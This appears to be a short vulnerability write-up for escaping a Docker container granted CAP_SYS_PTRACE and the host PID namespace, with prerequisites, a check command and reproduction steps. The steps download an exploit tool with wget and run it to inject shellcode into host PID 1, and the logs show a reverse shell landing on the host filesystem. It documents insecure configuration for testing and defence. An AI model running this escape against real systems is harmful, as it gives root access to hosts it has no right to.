# CAP_SYS_PTRACE escape with host pid namespace

## 1. Vulnerability Overview

A container with CAP_SYS_PTRACE and host pid namespace can be escaped by inject code into host process.

## 2. Exploit Scenario

Insecure Container Config

## 3. Prerequisite

1. CAP_SYS_PTRACE
2. host pid namespace
3. without apparmor

## 4. Vulnerability Existence Check

`ctrsploit checksec ptrace-pid-host`

## 5. Reproduce

### 5.1 Reproduce Environment

```shell
$ git clone https://github.com/ssst0n3/docker_archive.git
$ cd docker_archive/docker/v28.3.2
$ docker compose -f docker-compose.yml -f docker-compose.kvm up -d
```

<details><summary>env details</summary>

```shell
root@localhost:~# docker --version
Docker version 28.3.2, build 578ccf6
root@localhost:~# containerd --version
containerd containerd.io 1.7.27 05044ec0a9a75232cad458027ca83437aae3f4da
root@localhost:~# runc --version
runc version 1.2.5
commit: v1.2.5-0-g59923ef
spec: 1.2.0
go: go1.23.7
libseccomp: 2.5.5
```

</details>

### 5.2 Reproduce Steps

```shell
root@localhost:~# docker run -ti --cap-add CAP_SYS_PTRACE --pid host --security-opt apparmor=unconfined busybox:latest
/ # wget https://github.com/ctrsploit/ctrsploit/releases/latest/download/ctrsploit_linux_amd64 -O /usr/bin/ctrsploit
/ # ctrsploit vul caps ptrace x pid
INFO[0000] listening on 172.17.0.2:2333                 
INFO[0000] Injecting into PID: 1                        
INFO[0000] Reverse shell will connect to 172.17.0.2:2333 
INFO[0000] Attached. Process stopped. WaitStatus: 4991  
INFO[0000] Injected shellcode at RIP (0x7ddccfd2a007)   
INFO[0000] Child process forked with PID: 889           
INFO[0000] Parent process trapped. WaitStatus: 1407     
INFO[0000] Restored original code.                      
INFO[0000] Restored original registers.                 
INFO[0000] received connection from 172.17.0.1:37770    
ls -lah /
total 80K
drwxr-xr-x  21 root root 4.0K Jul 21 10:04 .
drwxr-xr-x  21 root root 4.0K Jul 21 10:04 ..
lrwxrwxrwx   1 root root    7 Apr 22  2024 bin -> usr/bin
drwxr-xr-x   2 root root 4.0K Mar 31  2024 bin.usr-is-merged
drwxr-xr-x   2 root root 4.0K Jul 21 10:03 boot
drwxr-xr-x  16 root root 3.8K Sep 11 02:17 dev
drwxr-xr-x  65 root root 4.0K Sep 11 02:17 etc
drwxr-xr-x   3 root root 4.0K Apr 15 14:11 home
lrwxrwxrwx   1 root root    7 Apr 22  2024 lib -> usr/lib
drwxr-xr-x   2 root root 4.0K Nov 14  2024 lib.usr-is-merged
lrwxrwxrwx   1 root root    9 Apr 22  2024 lib64 -> usr/lib64
drwx------   2 root root  16K Jul 21 10:03 lost+found
drwxr-xr-x   2 root root 4.0K Apr 15 14:04 media
drwxr-xr-x   2 root root 4.0K Apr 15 14:04 mnt
drwxr-xr-x   3 root root 4.0K Sep 11 02:17 opt
dr-xr-xr-x 156 root root    0 Sep 11 02:16 proc
drwx------   4 root root 4.0K Sep 11 02:17 root
drwxr-xr-x  19 root root  540 Sep 11 02:17 run
lrwxrwxrwx   1 root root    8 Apr 22  2024 sbin -> usr/sbin
drwxr-xr-x   2 root root 4.0K Mar 19 18:09 sbin.usr-is-merged
drwxr-xr-x   2 root root 4.0K Apr 15 14:04 srv
dr-xr-xr-x  13 root root    0 Sep 11 02:18 sys
drwxrwxrwt   9 root root 4.0K Sep 11 02:24 tmp
drwxr-xr-x  12 root root 4.0K Apr 15 14:04 usr
drwxr-xr-x  11 root root 4.0K Sep 11 02:17 var
```